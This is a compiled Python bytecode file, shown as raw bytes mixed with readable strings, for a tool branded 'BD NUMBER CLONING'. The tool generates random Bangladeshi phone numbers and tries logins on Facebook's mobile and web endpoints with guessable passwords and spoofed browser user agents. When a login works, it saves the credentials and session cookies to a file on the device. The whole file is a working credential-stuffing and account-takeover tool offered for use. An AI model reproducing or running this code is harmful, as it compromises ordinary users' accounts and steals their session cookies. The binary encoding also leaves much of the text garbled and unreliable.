o
    �
ec7-  �                   @   s�  d dl mZ d dlmZ d dlZd dlZd dlZd dl Z d dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl mZ d dlmZ d dlZd dlZd dl
Z
d dlZd dl	Z	d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlZd dlmZ d dlZzd dlZW n ey�   ed� e�d� Y nw zd dlZW n ey�   ed� e�d� Y nw zd dl Z W n ey�   ed	� e�d
� e�d� e�d� Y nw d dlZd dlZd dlZd dl Z d dlZd dl
Z
d dl	Z	d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dl mZ e� � Z!e!j"Z#g d�Z$ze#d k �sIe#dk�rLe%�  e#d Z&W n e'�y^   e%�  Y nw e� � Z(e(j)Z*e(j"Z+e(j,Z-e$e& Z.dZ/dZ0dZ1dZ2dZ3dZ4dZ5dZ6dZ7dZ8dZ9dZ:e�;e/e0e1e2e3e4e5e6e7e8e9g�Z<i i Z=Z>d\Z?Z@ZAg g g ZBZCZDg ZEg ZFg ZGd aHg aId aHdZJdZKd ZLd!d"iZMd#d$d%d&d'd(d)d*d+d,d-d.d/�ZNd0ZOg ZPeQd1�D ]�ZRd2ZSe�Tdd3�ZUe�Tdd3�ZVd4ZWe�Td5d6�ZXd7ZYe�Tdd3�ZZe�Tdd8�Z[e�Tdd8�Z\e�Tdd8�Z]d9Z^eS� eU� d:eV� d;eW� eX� eY� eZ� d:e[� d:e\� d:e]� d;e^� �Z_eP�`e_� d<Zae�;g d=��ZUd>ZVe�;g d?��ZWe�Tdd@�ZXe�;g d?��ZYdAZZe�TdBd5�Z[dCZ\e�TdDdE�Z]e�TdFdG�Z^dHZbea� d;eU� dIeV� eW� eX� eY� dJeZ� e[� d:e\� d:e]� d:e^� d;eb� �Z_eP�`e_� �q�dKdL� ZcdMdN� ZddOZez!e�dP� efegdQ��ZhdRZidSZjdSZjekei�ejv �r�e�dP� n	 W n	   e�dT� Y dUdV� ZldWdX� ZmendYk�r�ze�odZ� W n   Y ed�  dS dS )[�    )�BeautifulSoup)�ThreadPoolExecutorN)�ConnectionErroru!   
 [✓] installing requests !...
zpip install requestsu    
 [✓] installing futures !...
zpip install futuresu   
 [✓] installing bs4 !...
zpip install bs4zgit pullzpkg install curl)�datetime)�January�February�March�April�May�June�JulyZAgustus�	September�October�November�December�   �   z[31;1mz[32;1mz[33;1mz[34;1mz[35;1mz[36;1mz[91;1mz[92;1mz[93;1mz[94;1mz[95;1mz[96;1m)r   r   r   zhttps://lookup-id.com/zhttps://m.facebook.comzhttps://www.httpbin.org/ip�
user-agentz�Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   r   r   r	   r
   r   r   ZAugustusr   r   r   r   )Z01Z02Z03Z04Z05Z06Z07Z08Z09�10�11�12Fi'  z!Mozilla/5.0 (Symbian/3; Series60/�	   ZNokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9r   r   r   z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�e� rG   �	number.py�jalanu   s
   
�rI   c                  C   s�   t �d� tt� td� td� td� td� td� td� td�} | d	kr,t�  | d
kr8t �d� t�  | dkrDt �d� t�  | d	krPt �d� t�  | dkr[t �d� d S d S )N�clear��   [1;95m─────────────────────────────────────────────────────z5[1;92m[[1;91m1[1;92m][1;95m START NUMBER CLONING z3[1;92m[[1;91m2[1;92m][1;95m CONTACT ME FACEBOOKz5[1;92m[[1;91m3[1;92m][1;95m FOLLOW GITHUB ACCOUNTz+[1;92m[[1;91m4[1;92m][1;95m FOLLOW PAGEz,[1;92m[[1;91m0[1;92m][1;91m EXIT PROGRAMz
[1;32mCHOOSE : �1�3�)xdg-open https://github.com/PSYCHO-PICCHI�4z2xdg-open https://www.facebook.com/psycho.picchi.12z/xdg-open https://www.facebook.com/ps7c8o.p133h1r;   �exit)�os�systemrI   �logo�print�input�psycho�Psycho)ZPicchirG   rG   rH   rW   {   s0   




�rW   up  
[1;95m██████  ██  ██████  ██████ ██   ██ ██
[1;95m██   ██ ██ ██      ██      ██   ██ ██
[1;95m██████  ██ ██      ██      ███████ ██
[1;95m██      ██ ██      ██      ██   ██ ██
[1;95m██      ██  ██████  ██████ ██   ██ ██

[1;95m─────────────────────────────────────────────────────
[1;92m[[1;91m✔︎[1;92m][1;95m AUTHOR  [1;94m : [1;92mPSYCHO PICCHI
[1;92m[[1;91m✔︎[1;92m][1;95m FACEBOOK[1;94m : [1;92mPSYCHO PICCHI
[1;92m[[1;91m✔︎[1;92m][1;95m GITHUB  [1;94m : [1;92mPSYCHO-PICCHI
[1;92m[[1;91m✔︎[1;92m][1;95m TOOLS   [1;94m : [1;92mBD NUMBER CLONING 
[1;92m[[1;91m✔︎[1;92m][1;95m VERSION [1;94m : [1;90mLATEST
[1;95m─────────────────────────────────────────────────────rJ   z(
[1;92mFIRST FOLLOWING GITHUB :[1;96m g������@z5.2rN   c                  C   s�  g } g }t j t j t �d� tt� td� td� td� td�}td� t �d� tt� ttd��}t	|�D ]}d�
dd	� t	d
�D ��}| �|� q:tdd��Q}t �d� tt� tt| ��}t�d�j}td| � td| � td| � td� td� td� | D ]}	|	ddg}
||	 }|�t||
|� q�W d   � n1 s�w   Y  tdttt�� � td� td� t �d� d S )NrJ   rK   ze[1;30mBANGLADESH CODE - [1;32m016 [1;32m017 [1;32m013 [1;32m018 [1;32m019 [1;32m014 [1;32m015u�   [1;95m─────────────────────────────────────────────────────
z[1;92mCHOOSE BD CODE : � zP[1;93mEXAMPLE : [1;92m2000, 5000, 10000, 50000

[1;91mCHOOSE CLONING LIMIT : c                 s   s   � | ]	}t �tj�V  qd S )N)�random�choice�string�digits)�.0�_rG   rG   rH   �	<genexpr>�   s   � zpsycho.<locals>.<genexpr>�   �   )Zmax_workerszhttps://api.ipify.orgu>   [1;92m[[1;91m✔︎[1;92m][1;95m YOUR IP ADDRESS : [1;92mu?   [1;92m[[1;91m✔︎[1;92m][1;95m CHOOSE YOUR CODE : [1;92mu8   [1;92m[[1;91m✔︎[1;92m][1;95m TOTAL IDS : [1;92muA   [1;92m[[1;91m✔︎[1;92m][1;90m THE PROCESS HAS BEEN STARTEDu=   [1;92m[[1;91m✔︎[1;92m][1;91m TO STOP PROCESS Ctrl + ZZ
BangladeshZ
bangladeshu2   

[1;92m[[1;91m✔︎[1;92m][1;92m TOTAL OK : uA   [1;92m[[1;91m✔︎[1;92m][1;93m CHECK- /sdcard/PSYCHO-OK.txtu>   [1;92m[[1;91m✔︎[1;92m][1;90m PROCESS HAS BEEN COMPLETErP   )rQ   �getuid�geteuidrR   rI   rS   rU   rT   �int�range�join�append�
ThreadPool�str�len�requests�get�textZsubmit�rcrack�oks)�userZtwf�code�limitZnmbrZnmpZmanshera�tlZIPZlove�pwx�uidrG   rG   rH   rV   �   sL   



��rV   c                 C   s  z�|D ]�}t �� }t�t�}|�d�j}t�dt	|���
d�t�dt	|���
d�t�dt	|���
d�t�dt	|���
d�dd| |dd	�	}i d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�d&d'�d(d)�d*d+�d,d-|d.��}|jd/||d0�j}	|j�� �� }
d1|
v r�d2�d3d4� |j�� �� D ��}|d5d6� }td7|  d8 | d9 | d: � t||� td;d<��|d8 | d= � t�|�  nqtd7 at�ttttttttt t!t"g�}t#j$�d>|t|t%t�f �f t#j$�&�  W d S    Y d S )?Nzhttps://free.facebook.comzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"r;   zLog In)	ZlsdZjazoestZm_tsZliZ
try_numberZunrecognized_triesZemail�passZloginZ	authorityzweb.facebook.com�methodZGETZschemeZhttpsZacceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8,application/signed-exchange:v=b3;q=0.9zaccept-encodingzgzip, deflate, brzaccept-languagezen-US,en;q=1zcache-controlz#no-cache, no-store, must-revalidateZrefererzhttps://www.facebook.com/z	sec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"zsec-ch-ua-mobilez?0zsec-ch-ua-platformZLinuxzsec-fetch-destZdocumentzsec-fetch-modeZnavigatezsec-fetch-sitezsame-originzsec-fetch-userz?1Zpragmazno-cache�priorityzu=1zcross-originrL   )zcross-origin-resource-policyzupgrade-insecure-requestsr   zAhttps://web.facebook.com/login/device-based/regular/login/?refsrc)�dataZheadersZc_user�;c                 S   s   g | ]
\}}|d  | �qS )�=rG   )r]   �key�valuerG   rG   rH   �
<listcomp>�   s    zrcrack.<locals>.<listcomp>�   �   z[1;92m[PSYCHO-OK] z | z 
[1;35mCOOKIES : [1;32mz  z/sdcard/PSYCHO-OK.txt�ar>   z1%s[PICCHI-CRACK] [1;93m[%s/%s] [1;92m[OK-%s] )'rk   ZSessionrY   rZ   �ugenrl   rm   �re�searchri   �groupZpostZcookiesZget_dict�keysrf   �itemsrT   Zcek_apk�openrA   ro   rg   �loopr1   r&   r8   r!   r,   r"   �LR�LG�LY�LB�LMr?   r@   rj   rB   )ru   rt   rs   ZpsZsessionZproZfree_fbZlog_dataZheader_freefb�loZlog_cookiesZcokiZcid�dcrG   rG   rH   rn   �   s�   
�
��������	�
�������� 

 rn   �__main__ZOK)pZbs4r   ZsopZconcurrent.futuresr   rh   rQ   rY   rk   Zjsonr?   r   rC   r�   �
subprocess�platform�structZtred�base64r[   Z	mechanizeZrequests.exceptionsr   �ImportErrorrT   rR   Z
concurrentZ	threading�	itertoolsZuuid�zlibZahmadAXIZnowZctZmonth�nZbulanrP   ZnTemp�
ValueErrorZcurrentZyear�taZbuZdayZha�opr1   r&   r8   r!   r,   r"   r�   r�   r�   r�   r�   ZLCrZ   r�   ry   Zdata2ZamanZcpZsalahZubahPZfuckZpwBaru�ok�idrp   r�   ro   Z
url_lookupZurl_mbZurl_ipZheader_grupZ	bulan_ttlZdoner�   re   Zxdr�   Z	randrange�b�c�drF   �f�g�h�i�j�kZuaku2rg   Zaa�lrI   rW   rS   rd   rU   Znam�v�updateri   rV   rn   �__name__�mkdirrG   rG   rG   rH   �<module>   s   XH��

��
� 

<
B
�%
;
�